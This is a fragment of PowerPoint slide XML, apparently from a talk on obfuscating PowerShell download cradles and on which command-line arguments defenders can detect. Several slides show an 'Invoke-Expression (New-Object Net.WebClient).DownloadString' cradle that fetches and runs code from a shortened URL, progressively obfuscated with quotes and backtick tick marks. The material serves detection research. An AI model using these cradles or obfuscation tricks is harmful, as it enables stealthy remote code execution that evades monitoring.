              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFileAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadFileTaskAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadDataAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadDataTaskAsync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr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n-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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825705" y="2918858"/>
            <a:ext cx="2989564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Big difference between Invoke-Obfuscation &amp; Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>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Invoke-Obfuscation will NOT substitute methods that are logically different.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Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> gives you these options.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="14413008">
            <a:off x="7419703" y="3902259"/>
            <a:ext cx="336589" cy="2787927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Up Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="15205880">
            <a:off x="7662619" y="3734439"/>
            <a:ext cx="336589" cy="2076163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Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16888099">
            <a:off x="7601208" y="3291620"/>
            <a:ext cx="336589" cy="2147770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Up Arrow 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="18229802">
            <a:off x="7738454" y="2794929"/>
            <a:ext cx="336589" cy="2173130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91206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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download                                             (single quotes…)                   </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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41844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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download                                             (double quotes…)                   </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" strike="sngStrike" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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63096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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Down`load</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download                                                 (tick marks??)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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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85516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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>D`o`w`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>`l`o`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>`d`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>S`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1" smtClean="0"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1" smtClean="0"/>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>`i`</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0" err="1" smtClean="0"/>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>`g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>( '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>ht</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'+'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>tps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>://bit.ly/L3g1t')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Download 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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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25058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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
